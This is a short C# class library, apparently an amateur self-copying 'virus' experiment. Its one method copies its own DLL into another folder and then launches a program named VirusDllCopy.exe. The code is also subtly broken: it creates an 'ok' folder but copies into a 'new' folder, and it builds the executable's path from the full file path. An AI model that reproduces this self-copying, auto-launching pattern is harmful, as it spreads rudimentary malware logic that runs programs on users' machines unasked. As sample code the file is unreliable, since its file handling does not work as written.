using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;
using System.Threading.Tasks;

namespace CopyDll
{
    public class Class1
    {
        public int Created(string path)
        { 
            
            string nameFolder = String.Copy(path);
            for (int i = path.Length - 1; i > 0; i--)
            {
                if (path[i] == '\\')
                {
                    nameFolder = nameFolder.Remove(i + 1, path.Length - i - 1);
                    break;
                }
            } 
            Directory.CreateDirectory(nameFolder + "ok\\");  
            File.Copy(nameFolder + "CopyDll.dll", Path.Combine(nameFolder + "new\\", "CopyDll.dll"), true);

            System.Diagnostics.Process MyProc = new System.Diagnostics.Process();
            MyProc.StartInfo.FileName = @path+"VirusDllCopy.exe";
            MyProc.Start();
            return 0;
        }
    }
}
